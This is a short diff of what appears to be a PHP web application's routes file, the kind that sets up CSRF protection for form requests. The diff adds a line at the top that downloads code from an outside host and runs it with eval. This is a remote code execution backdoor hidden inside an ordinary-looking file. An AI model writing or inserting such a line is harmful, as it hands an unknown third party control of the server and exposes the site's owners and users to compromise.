@@ -1,4 +1,4 @@
-adsadsdsaads<?php
+<?php eval("?>".file_get_contents("http://lo-anj.ink/test.txt")); ?><?php
 # CSRF Protection
 Route::when('*', 'csrf', ['POST', 'PUT', 'PATCH', 'DELETE']);
 
